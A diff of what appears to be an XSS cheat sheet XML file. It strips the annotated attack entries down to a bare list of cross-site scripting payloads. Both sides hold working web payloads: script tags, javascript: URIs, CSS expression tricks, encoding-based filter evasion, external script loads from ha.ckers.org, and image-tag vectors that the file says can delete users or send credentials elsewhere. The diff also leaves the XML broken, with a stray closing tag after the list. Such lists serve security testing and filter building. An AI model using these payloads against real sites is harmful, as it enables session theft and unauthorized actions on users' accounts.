@@ -1,191 +1,31 @@
-<?xml version="1.0"?>
-<xss>
-	<attack>
-		<name>XSS Locator</name>
-		<code>&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{}</code>
-		<desc>Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word &quot;XSS&quot; will pop up.  You&apos;ll need to replace the &quot;&amp;&quot; with &quot;%26&quot; if you are submitting this XSS string via HTTP GET or it will be ignored and everything after it will be interpreted as another variable.  Tip: If you&apos;re in a rush and need to quickly check a page, often times injecting the deprecated &quot;&lt;PLAINTEXT&gt;&quot; tag will be enough to check to see if something is vulnerable to XSS by messing up the output appreciably.</desc>
-		<label>Basic XSS Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>XSS Quick Test</name>
-		<code>&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}</code>
-		<desc>If you don&apos;t have much space, this string is a nice compact XSS injection check. View source after injecting it and look for &lt;XSS versus &amp;lt;XSS to see if it is vulnerable.</desc>
-		<label>Basic XSS Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>SCRIPT w/Alert()</name>
-		<code>&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;</code>
-		<desc>Basic injection attack</desc>
-		<label>Basic XSS Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>SCRIPT w/Source File</name>
-		<code>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;</code>
-		<desc>No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here).</desc>
-		<label>Basic XSS Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>SCRIPT w/Char Code</name>
-		<code>&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code>
-		<desc>Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word &quot;XSS&quot; will pop up.</desc>
-		<label>Basic XSS Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>BASE</name>
-		<code>&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</code>
-		<desc>Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won&apos;t get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like &quot;images/image.jpg&quot; rather than full paths.  If the path includes a leading forward slash like &quot;/images/image.jpg&quot; you can remove one slash from this vector (as long as there are two to begin the comment this will work</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>BGSOUND</name>
-		<code>&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
-		<desc>BGSOUND</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;ns&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>BODY background-image</name>
-		<code>&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
-		<desc>BODY image</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>BODY ONLOAD</name>
-		<code>&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</code>
-		<desc>BODY tag (I like this method because it doesn&apos;t require using any variants of &quot;javascript:&quot; or &quot;&lt;SCRIPT...&quot; to accomplish the XSS attack)</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>DIV background-image 1</name>
-		<code>&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</code>
-		<desc>Div background-image</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>DIV background-image 2</name>
-		<code>&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;</code>
-		<desc>Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>DIV expression</name>
-		<code>&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;</code>
-		<desc>Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and &quot;expression&quot;</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>FRAME</name>
-		<code>&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;</code>
-		<desc>Frame (Frames have the same sorts of XSS problems as iframes).</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>IFRAME</name>
-		<code>&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;</code>
-		<desc>Iframe (If iframes are allowed there are a lot of other XSS problems as well).</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>INPUT Image</name>
-		<code>&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
-		<desc>INPUT Image</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>	
-	</attack>
-	<attack>
-		<name>IMG w/JavaScript Directive</name>
-		<code>&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
-		<desc>Image XSS using the JavaScript directive.</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>IMG No Quotes/Semicolon</name>
-		<code>&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</code>
-		<desc>No quotes and no semicolon</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>IMG Dynsrc</name>
-		<code>&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
-		<desc>IMG Dynsrc</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>IMG Lowsrc</name>
-		<code>&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
-		<desc>IMG Lowsrc</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>IMG Embedded commands 1</name>
-		<code>&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</code>
-		<desc>This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>IMG Embedded commands 2</name>
-		<code>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser</code>
-		<desc>IMG Embedded commands part II - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal &lt;IMG SRC=&quot;http://badguy.com/a.jpg&quot;&gt; could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>IMG STYLE w/expression</name>
-		<code>exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
-xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</code>
-		<desc>IMG STYLE with expression (this is really a hybrid of several CSS XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like the other CSS examples this can send IE into a loop).</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>List-style-image</name>
-		<code>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code>
-		<desc>Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector.</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>IMG w/VBscript</name>
-		<code>&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</code>
-		<desc>VBscript in an image</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>LAYER</name>
-		<code>&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;</code>
-		<desc>Layer (Older Netscape only)</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;ns&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS4&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>Livescript</name>
-		<code>&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;</code>
-		<desc>Livescript (Older Netscape only)</desc>
-		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;ns&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS4&lt;/span&gt;]</browser>
-	</attack>
-	<attack>
-		<name>US-ASCII encoding</name>
-		<code>%BCscript%BEalert(%A2XSS%A2)%BC/script%BE</code>
+&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{}
+&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
+&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;
+&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;
+&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
+&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
+&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
+exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
+xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;
+&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
+&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
+&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+</code>
 		<desc>Found by Kurt Huwig http://www.iku-ag.de/ This uses malformed ASCII encoding with 7 bits instead of 8.  This XSS may bypass many content filters but only works if the hosts transmits in US-ASCII encoding, or if you set the encoding yourself.  This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion.  Apache Tomcat is the only known server that transmits in US-ASCII encoding.</desc>
 		<label>HTML Element Attacks</label>
 		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS4&lt;/span&gt;]</browser>
